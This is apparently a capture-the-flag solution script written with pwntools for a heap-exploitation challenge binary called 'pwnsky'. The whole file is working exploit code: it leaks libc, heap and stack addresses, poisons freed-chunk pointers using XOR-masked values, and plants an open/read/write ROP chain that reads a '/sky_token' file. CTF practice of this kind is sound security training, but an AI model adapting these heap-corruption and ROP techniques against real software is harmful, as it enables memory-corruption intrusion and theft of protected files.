#coding=utf-8
from pwn import*
io=process('./pwnsky')
context.log_level = 'debug'
context.arch='amd64'
elf=ELF('./pwnsky')
libc = ELF('./lib/x86_64-linux-gnu/libc.so.6')

#gdb.attach(io,"b *$rebase(0x1663)")

def add(size,content):
	io.sendlineafter('$','add')
	io.sendlineafter('size?\n',str(size))
	io.send(content)
	
def show(index):
	io.sendlineafter('$','get')
	io.sendlineafter("index?",str(index))

def dele(index):
	io.sendlineafter('$','del')
	io.sendlineafter("index?",str(index))
	


io.recvuntil('\n')
io.sendline('Gleaf')
io.recvuntil('\n')
io.sendline('f1ag')
io.sendlineafter("$",'login')
io.sendlineafter('account:',str(0x3e8))
io.sendlineafter('password:',str(0x18F7D121))
add(0x410,'\n')#0
add(0x18,'\n')#1
dele(0)
add(0x410,'a'*7+'\n')

show(0)
malloc_hook=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-16
libc_base=malloc_hook-libc.sym['__malloc_hook']
print('libc_base',hex(libc_base))
environ=libc.sym['_environ']+libc_base
opens=libc.sym['open']+libc_base
read=libc.sym['read']+libc_base
write=libc.sym['write']+libc_base

add(0x20,'\n')#2
add(0x20,'\n')#3
dele(3)
dele(2)
add(0x20,'\n')#2
show(2)
io.recvuntil('\n')
heap_base=u64(io.recv(6).ljust(8,'\x00'))-0xbc0a
print('heap_base',hex(heap_base))

attach(io)
add(0x2f8,'\n')#3
add(0x3f8,'\n')#4
add(0xb8,'\n')#5
add(0x1f8,'\n')#6

dele(3)
pause()


add(0x2f8,p64(0x5c320f6069898f69)+'\x00'*0x2f0)#3
io.send('\xf1')
dele(4)
add(0x3e8,'\n')#4

add(0x58,'\n')#7
add(0xb8,'\n')#8
dele(8)
dele(5)#0x3c0
dele(7)#0x380
add(0x58,'\x00'*0x30+p64(0xc63b46d4aa52d377)+p64(0xc1^0x151edb8a53e4cae2)+p64(environ^0xf3014ff9682b57e3)+'\n')#5 0x380

add(0xb8,p64(environ^0x5c320f6069898f69)+'\n')#7 0x3c0
add(0xb8,'\n')#8 environ
show(8)
stack=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))+0x8e-0x3e0
print('stack',hex(stack))
add(0xb8,'\n')#9
dele(9)
dele(7)
dele(5)
add(0x58,'\x00'*0x30+p64(0xc63b46d4aa52d377)+p64(0xc1^0x151edb8a53e4cae2)+p64(stack^0xf3014ff9682b57e3)+'\n')#5
add(0xb8,'\n')#7

#open('/sky_token',0)
payload=p64((libc.search(asm('pop rdi\nret')).next()+libc_base)^0x5c320f6069898f69)
payload+=p64((stack+0x80)^0x0de3d33a0c1220ac)
payload+=p64((libc.search(asm('pop rsi\nret')).next()+libc_base)^0xa0293be2f9812301)
payload+=p64(0^0x5301d8fbeb89fdcc)
payload+=p64(opens^0xd2f251d00d3adb15)
#read(3,addr,0x30)
payload+=p64((libc.search(asm('pop rdi\nret')).next()+libc_base)^0xd026e346d0690e92)
payload+=p64(3^0xc63b46d4aa52d377)
payload+=p64((libc.search(asm('pop rsi\nret')).next()+libc_base)^0x151edb8a53e4cae2)
payload+=p64((stack+0x500)^0xf3014ff9682b57e3)
payload+=p64((0x000000000011c371+libc_base)^0x24f31353a0996c13)
payload+=p64(0x30^0xc65eeeccaee2d74d)
payload+=p64(0x151edb8a53e4caa2)
payload+=p64(read^0x3a40d30a4d0d05e3)
#write(1,addr,0x30)
payload+=p64((libc.search(asm('pop rdi\nret')).next()+libc_base)^0xd7464026f4300123)
payload+=p64(1^0x69d3b41a51aa9005)
payload+=p64(write^0x4033d7fc54021a4d)
payload+=p64(0x6b6f745f796b732f^0xf2cace7069203b02)
payload+=p64(0x6e65^0xb41208eeeddba63b)
#gdb.attach(io)
add(0xb8,payload+'\n')#9
io.interactive()